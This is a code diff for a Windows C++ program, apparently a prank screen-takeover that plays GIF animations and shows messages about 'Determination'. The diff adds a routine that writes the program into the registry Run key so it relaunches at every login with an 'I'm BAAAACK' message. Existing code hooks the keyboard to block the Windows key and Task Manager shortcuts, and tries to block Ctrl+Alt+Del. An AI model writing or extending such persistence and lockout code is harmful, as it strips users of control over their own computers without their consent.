@@ -1,9 +1,9 @@
 #include <windows.h>
 #include <gdiplus.h>
 #include <mmsystem.h> 
+#include <cstdio>
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
-
 
 using Gdiplus::Image;
 using Gdiplus::Graphics;
@@ -19,11 +19,34 @@ DWORD startTime = 0;
 UINT frameIndex = 0;
 UINT frameDelay = 100; 
 
-
 const DWORD OPENING_DURATION = 12290; 
 
 HHOOK keyboardHook = NULL;
 bool altPressed = false;
+
+// Function to add program to startup
+void AddToStartup() {
+    HKEY hKey;
+    const wchar_t* czStartName = L"OverlayApp";
+    
+    // Get current executable path
+    wchar_t szPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    
+    // Add startup argument
+    wchar_t szStartupPath[MAX_PATH + 20];
+    swprintf(szStartupPath, MAX_PATH + 20, L"\"%s\" -startup", szPath);
+    
+    LONG lnRes = RegOpenKeyExW(HKEY_CURRENT_USER,
+        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, &hKey);
+    
+    if (lnRes == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, czStartName, 0, REG_SZ, 
+            (LPBYTE)szStartupPath, (wcslen(szStartupPath) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
+}
 
 // Windows key blocker
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -46,10 +69,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (pKeyboard->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_LCONTROL) & 0x8000) && (GetAsyncKeyState(VK_LSHIFT) & 0x8000)) {
                 return 1; // Block Ctrl+Shift+Esc (Task Manager)
             }
-            
             if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000) && pKeyboard->vkCode == VK_DELETE) {
                 return 1; // Try to block (not working lmao)
-}
+            }
         }
         
         if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
@@ -73,12 +95,13 @@ void DrawGif(Graphics& graphics, Image* gif, UINT frameIdx, int width, int heigh
     gif->GetFrameDimensionsList(&dim, 1);
     UINT frameCount = gif->GetFrameCount(&dim);
     if (frameCount > 1) {
+        // select active frame (GDI+ handles animation timing if we pick frames periodically)
         gif->SelectActiveFrame(&dim, frameIdx % frameCount);
     }
 
     graphics.DrawImage(gif, 0, 0, width, height);
 }
-// some window proc stuff
+// Window procedure for handling messages
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
     case WM_PAINT: {
@@ -98,6 +121,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         EndPaint(hwnd, &ps);
     } break;
 
+    // Timer for frame updates
     case WM_TIMER:
         // advance animation frame
         frameIndex++;
@@ -105,11 +129,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         // change state opening -> idle GIF
         if (playingOpening && (GetTickCount() - startTime >= OPENING_DURATION)) {
             playingOpening = false;
-            frameIndex = 0; // reset for idle animation
+            frameIndex = 0; 
         }
         InvalidateRect(hwnd, NULL, TRUE);
-        break;
-
+        break; 
+    // Cleanup on destroy
     case WM_DESTROY:
         // Unhook keyboard before destroying
         if (keyboardHook) {
@@ -124,8 +148,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     }
     return 0;
 }
-// entry point
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     // Init GDI+
     GdiplusStartupInput gdiplusStartupInput;
     if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) {
@@ -133,9 +157,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
         return 1;
     }
 
-    // Popup message 
-    MessageBoxW(NULL, L"Your device is filled with Determination!", L"Notice", MB_OK | MB_ICONINFORMATION);
+    // Check if running from startup or manual launch
+    bool isStartupRun = (strstr(lpCmdLine, "-startup") != NULL);
+    
+    if (isStartupRun) {
+        // Startup launch message
+        MessageBoxW(NULL, L"I'm BAAAACK", L"", MB_OK | MB_ICONINFORMATION);
+    } else {
+        // Manual Launch or first run
+        MessageBoxW(NULL, L"Your Device is now filled with Determination!", L"Notice", MB_OK | MB_ICONINFORMATION);
+        
+        // Add to startup on first manual run
+        AddToStartup();
+    }
 
+    // Register window class (wide version)
     WNDCLASSW wc = {};
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
@@ -192,7 +228,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
         DispatchMessageW(&msg);
     }
 
-    // cleanup
+    // Cleanup
     KillTimer(hwnd, 1);
     if (keyboardHook) {
         UnhookWindowsHookEx(keyboardHook);
